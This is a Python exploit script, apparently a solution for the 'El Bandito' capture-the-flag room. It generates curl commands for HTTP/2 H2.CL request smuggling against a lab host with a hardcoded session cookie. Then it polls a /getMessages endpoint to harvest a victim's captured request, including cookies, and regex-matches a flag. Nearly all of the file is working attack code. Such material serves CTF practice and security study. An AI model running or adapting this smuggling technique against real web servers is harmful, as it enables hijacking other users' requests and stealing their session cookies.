#!/usr/bin/env python3
import requests
import time
import re
import json
from urllib3.exceptions import InsecureRequestWarning

# Disable SSL warnings
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# Configuration
TARGET_IP = "10.10.75.26"
DOMAIN = "elbandito.thm:80"
SESSION_COOKIE = "eyJ1c2VybmFtZSI6ImhBY2tMSUVOIn0.Z-rKtg.CyaOpfDjNdjcJgsJn1FvGXf6dM0"  # Update with your session cookie

def http2_smuggle():
    """
    Perform HTTP/2 request smuggling to capture a victim's request
    This exploits the H2.CL vulnerability (HTTP/2 downgrade via Content-Length)
    """
    print("[+] Attempting HTTP/2 request smuggling (H2.CL)...")
    
    # First prepare the smuggled request with Content-Length: 0
    # This will be followed by a second request that will capture victim's data
    
    # Command using IP address
    smuggle_command_ip = f"""
    curl -k -v -X POST "https://{TARGET_IP}/" \\
    -H "Host: {DOMAIN}" \\
    -H "Cookie: session={SESSION_COOKIE}" \\
    -H "Content-Length: 0" \\
    --http2 \\
    --data-binary @- << 'EOF'
POST /send_message HTTP/1.1
Host: {DOMAIN}
Cookie: session={SESSION_COOKIE}
Content-Type: application/x-www-form-urlencoded
Content-Length: 730

data=
EOF
    """
    
    # Command using domain name (if you have proper DNS resolution)
    smuggle_command_domain = f"""
    curl -k -v -X POST "https://{DOMAIN}/" \\
    -H "Host: {DOMAIN}" \\
    -H "Cookie: session={SESSION_COOKIE}" \\
    -H "Content-Length: 0" \\
    --http2 \\
    --data-binary @- << 'EOF'
POST /send_message HTTP/1.1
Host: {DOMAIN}
Cookie: session={SESSION_COOKIE}
Content-Type: application/x-www-form-urlencoded
Content-Length: 730

data=
EOF
    """
    
    print("\n[+] Execute one of the following commands manually to perform smuggling:")
    print("[+] Option 1 (using IP address):")
    print(smuggle_command_ip)
    print("\n[+] Option 2 (using domain name - requires DNS resolution):")
    print(smuggle_command_domain)
    print("\n[+] Execute your chosen command several times until you get a delayed response or 503 error")
    print("[+] Then wait about 1-2 minutes for victim's request to be captured")
    
    proceed = input("\n[?] Have you executed the smuggling attack? (yes/no): ")
    if proceed.lower() != "yes":
        print("[-] Smuggling attack not executed. Exiting.")
        return False
    
    return True

def check_messages_ip():
    """Check /getMessages endpoint using IP address for captured requests containing the flag"""
    print("\n[+] Checking for captured messages using IP address...")
    
    try:
        cookies = {"session": SESSION_COOKIE}
        response = requests.get(
            f"https://{TARGET_IP}/getMessages",
            headers={"Host": DOMAIN},
            cookies=cookies,
            verify=False,
            timeout=10
        )
        
        if response.status_code != 200:
            print(f"[-] Failed to get messages: HTTP {response.status_code}")
            return None
        
        # Try to parse JSON response
        try:
            messages = response.json()
            print(f"[+] Retrieved {len(messages)} message(s)")
            
            # Convert the entire messages object to a string for easy flag searching
            messages_str = str(messages)
            
            # Look for flag pattern
            flag_pattern = re.compile(r'(?:flag|THM)\{[^}]+\}', re.IGNORECASE)
            matches = flag_pattern.findall(messages_str)
            
            if matches:
                print(f"[+] Found potential flag: {matches[0]}")
                return matches[0]
            
            # If no flag pattern found, print the latest messages for manual inspection
            print("\n[+] Latest messages for manual inspection:")
            print(json.dumps(messages, indent=2)[:1000] + "..." if len(json.dumps(messages, indent=2)) > 1000 else json.dumps(messages, indent=2))
            
            # Also check specifically for cookie-related content as mentioned in writeup
            if "cookie" in messages_str.lower():
                print("\n[+] Found cookie-related content. Check the above messages for the flag manually.")
            
            return None
            
        except json.JSONDecodeError:
            print("[-] Failed to parse JSON response. Raw response:")
            print(response.text[:1000] + "..." if len(response.text) > 1000 else response.text)
            return None
            
    except requests.RequestException as e:
        print(f"[-] Error checking messages: {e}")
        return None

def check_messages_domain():
    """Check /getMessages endpoint using domain name for captured requests containing the flag"""
    print("\n[+] Checking for captured messages using domain name...")
    
    try:
        cookies = {"session": SESSION_COOKIE}
        response = requests.get(
            f"https://{DOMAIN}/getMessages",
            cookies=cookies,
            verify=False,
            timeout=10
        )
        
        if response.status_code != 200:
            print(f"[-] Failed to get messages: HTTP {response.status_code}")
            return None
        
        # Try to parse JSON response
        try:
            messages = response.json()
            print(f"[+] Retrieved {len(messages)} message(s)")
            
            # Convert the entire messages object to a string for easy flag searching
            messages_str = str(messages)
            
            # Look for flag pattern
            flag_pattern = re.compile(r'(?:flag|THM)\{[^}]+\}', re.IGNORECASE)
            matches = flag_pattern.findall(messages_str)
            
            if matches:
                print(f"[+] Found potential flag: {matches[0]}")
                return matches[0]
            
            # If no flag pattern found, print the latest messages for manual inspection
            print("\n[+] Latest messages for manual inspection:")
            print(json.dumps(messages, indent=2)[:1000] + "..." if len(json.dumps(messages, indent=2)) > 1000 else json.dumps(messages, indent=2))
            
            # Also check specifically for cookie-related content as mentioned in writeup
            if "cookie" in messages_str.lower():
                print("\n[+] Found cookie-related content. Check the above messages for the flag manually.")
            
            return None
            
        except json.JSONDecodeError:
            print("[-] Failed to parse JSON response. Raw response:")
            print(response.text[:1000] + "..." if len(response.text) > 1000 else response.text)
            return None
            
    except requests.RequestException as e:
        print(f"[-] Error checking messages: {e}")
        return None

def main():
    print("=== HTTP/2 Request Smuggler for El Bandito ===")
    print(f"Target IP: {TARGET_IP}")
    print(f"Target Domain: {DOMAIN}")
    
    # Attempt HTTP/2 request smuggling
    if not http2_smuggle():
        return
    
    # Check for captured messages containing the flag
    print("\n[+] Waiting for victim's request to be captured (30 seconds)...")
    time.sleep(30)
    
    # Try both methods to check messages
    flag = check_messages_ip()
    
    if not flag:
        flag = check_messages_domain()
    
    if flag:
        print(f"\n[+] SUCCESS! Flag found: {flag}")
    else:
        print("\n[-] Flag not found automatically.")
        print("[*] Look for cookie information in the messages output above.")
        print("[*] The flag might be in a cookie value as mentioned in the writeup.")
        print("[*] You may need to wait longer and check manually if the victim hasn't made a request yet.")

if __name__ == "__main__":
    main()
